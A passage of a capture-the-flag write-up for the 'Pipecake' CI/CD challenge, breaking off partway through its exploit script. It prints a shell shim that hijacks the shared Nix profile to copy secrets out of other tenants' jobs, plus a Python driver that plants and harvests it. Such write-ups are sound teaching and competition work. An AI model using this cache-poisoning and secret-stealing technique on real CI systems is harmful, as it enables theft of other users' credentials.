+<p>The local <code>flag_watcher</code> submitted it at <code>2026-11-21T03:17:32Z</code> and received
+<code>{"correct": true, "ctf_state": "active"}</code> (HTTP 200).</p>
+<h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<p>The challenge is blind (<code>has_file=false</code>) and only exposes a URL:</p>
+<div class="highlight"><pre><span></span><code>$ python3 l7.py chall 10
+{&quot;id&quot;: 10, &quot;title&quot;: &quot;Pipecake&quot;, &quot;category&quot;: &quot;web&quot;, &quot;points&quot;: 998,
+ &quot;connection_info&quot;: &quot;http://172.237.8.236:21108&quot;, ...}
+</code></pre></div>
+<p>The product pages and docs (<code>/docs/</code>) describe a self-hosted Forgejo + Nix
+CI/CD platform. The important statements are in <code>/docs/operations/</code>:</p>
+<ul>
+<li>the backend uses the Docker socket to start runner containers;</li>
+<li>runner containers do <strong>not</strong> mount the Docker socket;</li>
+<li>"all runners share the same writable <code>/nix</code> volume … this store sharing does
+  not provide security isolation between jobs";</li>
+<li>pipeline commands and repository secrets are passed into the job environment.</li>
+</ul>
+<p>Registration on the bundled Forgejo is open, so the intended entry point is a
+normal user account and a normal repository:</p>
+<div class="highlight"><pre><span></span><code>$ curl -s -X POST http://172.237.8.236:21108/git/user/sign_up     -d user_name=b0tcil... -d email=... -d password=... -d retype=...
+303 -&gt; /git/
+$ curl -s -u &quot;$USER:$PASS&quot; http://172.237.8.236:21108/git/api/v1/user
+{&quot;id&quot;:200,&quot;login&quot;:&quot;b0tcil...&quot;,&quot;is_admin&quot;:false,...}
+</code></pre></div>
+<p>A repository was created via the Forgejo API, then connected to Pipecake through
+the normal OAuth flow (<code>GET /api/auth/forgejo</code> → Forgejo consent →
+<code>/api/auth/forgejo/callback</code>):</p>
+<div class="highlight"><pre><span></span><code>$ curl -s -b cookies -X POST http://172.237.8.236:21108/api/repositories     -H &#39;Content-Type: application/json&#39; -d &#39;{&quot;full_name&quot;:&quot;b0tcil.../explore&quot;}&#39;
+{&quot;active&quot;:true,&quot;full_name&quot;:&quot;b0tcil.../explore&quot;,&quot;id&quot;:&quot;2b8dad39-...&quot;}
+</code></pre></div>
+<p>Pushing <code>.pipecake/pipeline.yaml</code> registers a webhook. Pipecake also allows
+manual runs (<code>POST /api/runs</code> with a full commit SHA), but limits each user to
+one pipeline run every 3 minutes.</p>
+<p>The first useful pipeline simply enumerated the runner:</p>
+<div class="highlight"><pre><span></span><code>$ id
+uid=0(root) gid=0(root) groups=0(root)
+$ cat /proc/mounts | grep &#39; /nix &#39;
+/dev/sda /nix ext4 rw,relatime,errors=remount-ro 0 0
+</code></pre></div>
+<p><code>/nix</code> is a persistent ext4 volume shared by all jobs. The runner's command line
+(<code>/proc/1</code>) confirms the design:</p>
+<div class="highlight"><pre><span></span><code>cd /workspace
+export NIX_REMOTE=local
+profile=/tmp/pipecake-profile
+trap &#39;rm -rf /tmp/pipecake-profile* /workspace&#39; EXIT
+nix ... profile install --profile &quot;$profile&quot; &#39;nixpkgs#gnugrep&#39;
+export PATH=&quot;$profile/bin:$PATH&quot;
+bash -euo pipefail -c &#39;&lt;pipeline step&gt;&#39;
+</code></pre></div>
+<h2 id="analysis">Analysis<a class="headerlink" href="#analysis" title="Permanent link">&para;</a></h2>
+<p>Because <code>/nix</code> survives between jobs and is writable by root, the whole Nix
+store and the shared profile are a cross-tenant channel. During a later
+inspection run, <code>/root/.nix-profile/bin/nix</code> was a <strong>441-byte shell script</strong>
+instead of a symlink to the real Nix binary:</p>
+<div class="highlight"><pre><span></span><code>$ readlink -f /root/.nix-profile/bin/nix
+/nix/var/pipecake-124de1e7/profile-0d89cd16-.../bin/nix
+
+$ cat /root/.nix-profile/bin/nix
+#!/nix/store/13czpvp88x852739v5xi04s871pn35b5-bash-interactive-5.3p9/bin/bash
+capture=/nix/var/pipecake-124de1e7/capture
+printf &#39;nix %s host=%s pwd=%s\n&#39; &quot;$(date -u +%s)&quot; &quot;$(hostname)&quot; &quot;$PWD&quot; &gt;&gt; &quot;$capture&quot;
+printenv | grep -oE &#39;Layer7\{[^}]+\}&#39; &gt;&gt; &quot;$capture&quot; || true
+timeout 10 grep -r -a -o -E &#39;Layer7\{[^}]+\}&#39; /workspace 2&gt;/dev/null | head -10 &gt;&gt; &quot;$capture&quot; || true
+exec /nix/store/g3m57m0jcdj84fas49lpiwpisacp20gr-nix-2.35.6/bin/nix &quot;$@&quot;
+</code></pre></div>
+<p>This is a classic profile-hijack payload: the shim runs on every <code>nix</code>
+invocation, records the environment and the job workspace, and then <code>exec</code>s the
+real Nix so the build still succeeds. The capture file was already populated by
+a victim job:</p>
+<div class="highlight"><pre><span></span><code>$ tail -80 /nix/var/pipecake-124de1e7/capture
+...
+bash 1795231035 pwd=/workspace
+Layer7{p0isoned_cak3}
+bash 1795231035 pwd=/workspace
+
+$ grep -raoE &#39;Layer7\{[^}]+\}&#39; /nix/var 2&gt;/dev/null | sort -u
+/nix/var/.nmdrop/d1-2463.txt:Layer7{p0isoned_cak3}
+/nix/var/.nmdrop/d1-27200.txt:Layer7{p0isoned_cak3}
+/nix/var/pipecake-124de1e7/capture:Layer7{p0isoned_cak3}
+</code></pre></div>
+<p>The timestamp <code>1795231035</code> is <code>2026-11-21 03:17:15Z</code>. That is exactly when a
+concurrent job (the <code>imnyang/flag-vault</code> deployment, whose flag is injected as
+a repository secret / workspace value) called <code>nix</code>; the shim captured the flag
+into the shared volume. The flag name <code>p0isoned_cak3</code> also matches the intended
+"poison the shared Nix store" theme.</p>
+<p>On a clean instance the same effect is obtained by overwriting the current
+shared profile's <code>bin/nix</code> from our own pipeline (<code>--plant</code> mode in the script
+below), then waiting for the flag-vault job to run. The victim's <code>nix profile
+install</code> resolves <code>nix</code> through <code>/root/.nix-profile/bin</code>, so our shim executes
+before the victim's steps and exfiltrates <code>printenv</code> and <code>/workspace</code>.</p>
+<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
+<p>The end-to-end driver is saved as <code>work/10/exploit.py</code>. It registers/logs into
+Forgejo, creates and connects a repository, pushes the harvesting pipeline,
+triggers a manual run (honouring the 1-run-per-3-minutes limit), polls the run,
+and extracts every <code>Layer7{...}</code> from the logs. Pass <code>--plant</code> to also install
+the capture shim into the shared profile.</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">Pipecake (Layer7 CTF 2026, web, 998 pts) -- end-to-end exploit.</span>
+
+<span class="sd">Root cause</span>
+<span class="sd">----------</span>
+<span class="sd">Pipecake runs every CI job as root in a container that bind-mounts one shared,</span>
+<span class="sd">writable /nix volume (`/dev/sda on /nix ... rw`).  The Nix profile used to</span>
+<span class="sd">resolve the `nix` binary is also on that volume</span>
+<span class="sd">(`/root/.nix-profile -&gt; /nix/var/nix/profiles/default -&gt;</span>
+<span class="sd"> /nix/var/pipecake-&lt;deployment&gt;/profile-*`).  A job from tenant A can replace</span>
+<span class="sd">that `nix` shim with a small shell script.  Every later job -- including the</span>
+<span class="sd">challenge&#39;s `imnyang/flag-vault` deployment job -- invokes `nix` before its</span>
+<span class="sd">steps run, so the shim executes first and can copy `Layer7{...}` out of the</span>
+<span class="sd">victim&#39;s environment/workspace into the shared volume.</span>
+
+<span class="sd">This script recreates the attacker side:</span>
+<span class="sd">  1. registers a normal Forgejo account and a repository,</span>
+<span class="sd">  2. connects the repository to Pipecake through the OAuth flow,</span>
+<span class="sd">  3. pushes a pipeline, triggers a manual run and reads its logs,</span>
+<span class="sd">  4. the pipeline (a) plants a capture shim in the shared Nix profile and</span>
+<span class="sd">     (b) harvests everything previously captured from other tenants.</span>
+
+<span class="sd">Usage:  python3 exploit.py [--plant]</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">json</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">subprocess</span><span class="o">,</span> <span class="nn">tempfile</span><span class="o">,</span> <span class="nn">shutil</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">BASE</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;PIPECAKE&quot;</span><span class="p">,</span> <span class="s2">&quot;http://172.237.8.236:21108&quot;</span><span class="p">)</span>
+<span class="n">HERE</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="vm">__file__</span><span class="p">))</span>
+<span class="n">PLANT</span> <span class="o">=</span> <span class="s2">&quot;--plant&quot;</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span>
+
+<span class="c1"># ---------------------------------------------------------------- Forgejo ----</span>
+<span class="k">def</span> <span class="nf">forgejo_login</span><span class="p">():</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Return (user, password, [user, password] for git).&quot;&quot;&quot;</span>
+    <span class="n">uf</span><span class="p">,</span> <span class="n">pf</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">HERE</span><span class="p">,</span> <span class="s2">&quot;forgejo_user.txt&quot;</span><span class="p">),</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">HERE</span><span class="p">,</span> <span class="s2">&quot;forgejo_pass.txt&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">uf</span><span class="p">)</span> <span class="ow">and</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">pf</span><span class="p">):</span>
+        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="n">uf</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="nb">open</span><span class="p">(</span><span class="n">pf</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">user</span> <span class="o">=</span> <span class="s2">&quot;b0tcil</span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
+    <span class="n">pw</span> <span class="o">=</span> <span class="s2">&quot;P@ssw0rd-</span><span class="si">%d</span><span class="s2">!&quot;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s2">&quot;/git/user/sign_up&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+        <span class="s2">&quot;user_name&quot;</span><span class="p">:</span> <span class="n">user</span><span class="p">,</span> <span class="s2">&quot;email&quot;</span><span class="p">:</span> <span class="n">user</span> <span class="o">+</span> <span class="s2">&quot;@example.com&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="n">pw</span><span class="p">,</span> <span class="s2">&quot;retype&quot;</span><span class="p">:</span> <span class="n">pw</span><span class="p">},</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">302</span><span class="p">,</span> <span class="mi">303</span><span class="p">):</span>
+        <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="s2">&quot;signup failed: </span><span class="si">%s</span><span class="s2"> </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="mi">200</span><span class="p">]))</span>
+    <span class="nb">open</span><span class="p">(</span><span class="n">uf</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">user</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span> <span class="nb">open</span><span class="p">(</span><span class="n">pf</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pw</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">user</span><span class="p">,</span> <span class="n">pw</span>
+
+<span class="k">def</span> <span class="nf">create_repo</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">pw</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;explore&quot;</span><span class="p">):</span>
+    <span class="n">api</span> <span class="o">=</span> <span class="n">BASE</span> <span class="o">+</span> <span class="s2">&quot;/git/api/v1&quot;</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">api</span> <span class="o">+</span> <span class="s2">&quot;/user/repos&quot;</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">pw</span><span class="p">),</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
+        <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="n">name</span><span class="p">,</span> <span class="s2">&quot;private&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;auto_init&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
+        <span class="s2">&quot;default_branch&quot;</span><span class="p">:</span> <span class="s2">&quot;main&quot;</span><span class="p">},</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">201</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&quot;full_name&quot;</span><span class="p">]</span>
+    <span class="c1"># already exists</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">api</span> <span class="o">+</span> <span class="s2">&quot;/repos/</span><span class="si">%s</span><span class="s2">/</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">name</span><span class="p">),</span> <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">pw</span><span class="p">),</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&quot;full_name&quot;</span><span class="p">]</span>
+
+<span class="n">PIPELINE</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;&#39;&#39;version: 1</span>
+<span class="s1">triggers: [manual]</span>
+<span class="s1">jobs:</span>
+<span class="s1">  harvest:</span>
+<span class="s1">    nix:</span>
+<span class="s1">      packages: [nixpkgs#gnugrep]</span>
+<span class="s1">    steps:</span>
+<span class="s1">      - run: |</span>
+<span class="s1">          set +e</span>
+<span class="s1">          # ---- attacker step: hijack the shared nix shim for future jobs ----</span>
+<span class="s1">          if [ &quot;</span><span class="si">%%</span><span class="s1">PLANT</span><span class="si">%%</span><span class="s1">&quot; = &quot;1&quot; ]; then</span>
+<span class="s1">            P=&quot;$(readlink -f /root/.nix-profile)&quot;</span>
+<span class="s1">            CAP=/nix/var/.nmdrop/$$.txt</span>
+<span class="s1">            mkdir -p /nix/var/.nmdrop</span>
+<span class="s1">            cat &gt; &quot;$P/bin/nix&quot; &lt;&lt;SH</span>
+<span class="s1">#!/bin/sh</span>
+<span class="s1">C=/nix/var/.nmdrop/capture.txt</span>
+<span class="s1">printenv | grep -aoE &#39;Layer7\{[^}]+\}&#39; &gt;&gt; &quot;\$C&quot; 2&gt;/dev/null</span>
+<span class="s1">grep -raoE &#39;Layer7\{[^}]+\}&#39; /workspace 2&gt;/dev/null | head -20 &gt;&gt; &quot;\$C&quot;</span>
+<span class="s1">exec /nix/store/g3m57m0jcdj84fas49lpiwpisacp20gr-nix-2.35.6/bin/nix &quot;\$@&quot;</span>
+<span class="s1">SH</span>
+<span class="s1">            chmod +x &quot;$P/bin/nix&quot;</span>
+<span class="s1">          fi</span>
+<span class="s1">          # ---- harvest every capture ever written on the shared volume ----</span>
+<span class="s1">          echo &quot;=== captures ===&quot;</span>
+<span class="s1">          for f in /nix/var/pipecake-*/capture /nix/var/.nmdrop/*; do</span>
+<span class="s1">            [ -f &quot;$f&quot; ] || continue</span>
+<span class="s1">            echo &quot;--- $f&quot;</span>
+<span class="s1">            grep -aoE &#39;Layer7\{[^}]+\}&#39; &quot;$f&quot; | sort -u</span>
+<span class="s1">          done</span>
+<span class="s1">          echo &quot;=== also scan shared state ===&quot;</span>
+<span class="s1">          grep -raoE &#39;Layer7\{[^}]+\}&#39; /nix/var 2&gt;/dev/null | sort -u | head -50</span>
+<span class="s1">    timeout: 120</span>
+<span class="s1">&#39;&#39;&#39;</span>
+<span class="n">PIPELINE</span> <span class="o">=</span> <span class="n">PIPELINE</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%%</span><span class="s2">PLANT</span><span class="si">%%</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;1&quot;</span> <span class="k">if</span> <span class="n">PLANT</span> <span class="k">else</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+
+<span class="c1"># --------------------------------------------------------------- Pipecake ----</span>
+<span class="k">def</span> <span class="nf">forgejo_web_login</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">pw</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Log the same cookie jar into the Forgejo web UI (needed for OAuth).&quot;&quot;&quot;</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s2">&quot;/git/user/login&quot;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;user_name&quot;</span><span class="p">:</span> <span class="n">user</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="n">pw</span><span class="p">}</span>
+    <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;name=&quot;_csrf&quot; value=&quot;([^&quot;]+)&quot;&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
+        <span class="n">data</span><span class="p">[</span><span class="s2">&quot;_csrf&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s2">&quot;/git/user/login&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">pipecake_session</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">pw</span><span class="p">,</span> <span class="n">full_name</span><span class="p">):</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+    <span class="n">forgejo_web_login</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">pw</span><span class="p">)</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s2">&quot;/api/auth/forgejo&quot;</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>
+    <span class="n">auth_url</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">&quot;location&quot;</span><span class="p">]</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">auth_url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>                 <span class="c1"># Forgejo is already logged in</span>
+    <span class="c1"># first consent: POST the grant form</span>
+    <span class="k">if</span> <span class="s2">&quot;/login/oauth/grant&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">url</span> <span class="ow">or</span> <span class="s2">&quot;Authorize&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="n">fields</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;name=&quot;([^&quot;]+)&quot; value=&quot;([^&quot;]*)&quot;&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">))</span>
+        <span class="n">fields</span><span class="p">[</span><span class="s2">&quot;granted&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;true&quot;</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s2">&quot;/git/login/oauth/grant&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">fields</span><span class="p">,</span>
+                   <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>
+        <span class="n">cb</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;location&quot;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">cb</span><span class="p">:</span>
+            <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">cb</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>
+    <span class="n">me</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s2">&quot;/api/me&quot;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>
+    <span class="n">me</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+    <span class="c1"># connect the repository (webhook is installed server-side)</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s2">&quot;/api/repositories&quot;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;full_name&quot;</span><span class="p">:</span> <span class="n">full_name</span><span class="p">},</span>
+               <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;Origin&quot;</span><span class="p">:</span> <span class="n">BASE</span><span class="p">,</span> <span class="s2">&quot;Referer&quot;</span><span class="p">:</span> <span class="n">BASE</span> <span class="o">+</span> <span class="s2">&quot;/dashboard&quot;</span><span class="p">},</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="s2">&quot;connect failed: </span><span class="si">%s</span><span class="s2"> </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="mi">300</span><span class="p">]))</span>
+    <span class="n">repo_id</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&quot;id&quot;</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">s</span><span class="p">,</span> <span class="n">repo_id</span>
+
+<span class="k">def</span> <span class="nf">push_repo</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">pw</span><span class="p">,</span> <span class="n">full_name</span><span class="p">):</span>
+    <span class="n">d</span> <span class="o">=</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">mkdtemp</span><span class="p">(</span><span class="n">prefix</span><span class="o">=</span><span class="s2">&quot;pipecake-&quot;</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="s2">&quot;.pipecake&quot;</span><span class="p">))</span>
+    <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="s2">&quot;.pipecake&quot;</span><span class="p">,</span> <span class="s2">&quot;pipeline.yaml&quot;</span><span class="p">),</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">PIPELINE</span><span class="p">)</span>
+    <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="s2">&quot;README.md&quot;</span><span class="p">),</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;pipecake</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">k</span><span class="p">):</span> <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">cwd</span><span class="o">=</span><span class="n">d</span><span class="p">,</span> <span class="o">**</span><span class="n">k</span><span class="p">)</span>
+    <span class="n">run</span><span class="p">(</span><span class="s2">&quot;git&quot;</span><span class="p">,</span> <span class="s2">&quot;init&quot;</span><span class="p">,</span> <span class="s2">&quot;-q&quot;</span><span class="p">,</span> <span class="s2">&quot;-b&quot;</span><span class="p">,</span> <span class="s2">&quot;main&quot;</span><span class="p">)</span>
+    <span class="n">run</span><span class="p">(</span><span class="s2">&quot;git&quot;</span><span class="p">,</span> <span class="s2">&quot;config&quot;</span><span class="p">,</span> <span class="s2">&quot;user.email&quot;</span><span class="p">,</span> <span class="s2">&quot;a@b.c&quot;</span><span class="p">);</span> <span class="n">run</span><span class="p">(</span><span class="s2">&quot;git&quot;</span><span class="p">,</span> <span class="s2">&quot;config&quot;</span><span class="p">,</span> <span class="s2">&quot;user.name&quot;</span><span class="p">,</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span>
+    <span class="n">run</span><span class="p">(</span><span class="s2">&quot;git&quot;</span><span class="p">,</span> <span class="s2">&quot;add&quot;</span><span class="p">,</span> <span class="s2">&quot;-A&quot;</span><span class="p">);</span> <span class="n">run</span><span class="p">(</span><span class="s2">&quot;git&quot;</span><span class="p">,</span> <span class="s2">&quot;commit&quot;</span><span class="p">,</span> <span class="s2">&quot;-q&quot;</span><span class="p">,</span> <span class="s2">&quot;-m&quot;</span><span class="p">,</span> <span class="s2">&quot;harvest&quot;</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2">/git/</span><span class="si">%s</span><span class="s2">.git&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">BASE</span><span class="p">,</span> <span class="n">full_name</span><span class="p">)</span>
